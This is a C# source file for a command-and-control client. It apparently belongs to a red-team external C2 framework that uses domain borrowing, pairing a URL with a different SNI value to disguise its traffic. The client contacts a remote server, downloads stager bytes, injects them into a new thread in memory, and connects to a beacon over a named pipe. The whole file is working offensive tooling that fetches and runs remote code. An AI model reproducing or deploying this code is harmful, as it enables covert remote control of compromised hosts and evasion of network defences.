using System;
using ClientC2.connectors;
using ClientC2.interfaces;
using ClientC2.channels;

namespace ClientC2
{
    public class Client : BeaconConnector, IC2Connector
    {
        public Guid PipeName { get; private set; }

        private DomainBorrowingChannel Server => (DomainBorrowingChannel)ServerChannel;
        private BeaconChannel Beacon => (BeaconChannel)BeaconChannel;

        public Client(string url, string sni, int port = 443, int sleep = 60000)
            : base(new DomainBorrowingChannel(url, sni, port), sleep)
        {
            BeaconChannel = new BeaconChannel(PipeName);
            ServerChannel = new DomainBorrowingChannel(url, sni, port);
        }

        public override Func<bool> Initialize => () =>
        {
            Console.WriteLine("[-] Connecting to Web Endpoint");
            if (!Server.Connect()) return false;

            Console.WriteLine("[-] Grabbing stager bytes");
            PipeName = Server.BeaconId;
            var stager = Server.GetStager(PipeName.ToString(), Is64Bit);

            Console.WriteLine("[-] Creating new stager thread");
            if (InjectStager(stager) == 0) return false;
            Console.WriteLine("[+] Stager thread created!");

            Console.WriteLine($"[-] Connecting to pipe {PipeName}");
            Beacon.SetPipeName(PipeName);
            if (!Beacon.Connect()) return false;
            Console.WriteLine("[+] Connected to pipe. C2 initialization complete!");

            return true;
        };
    }
}
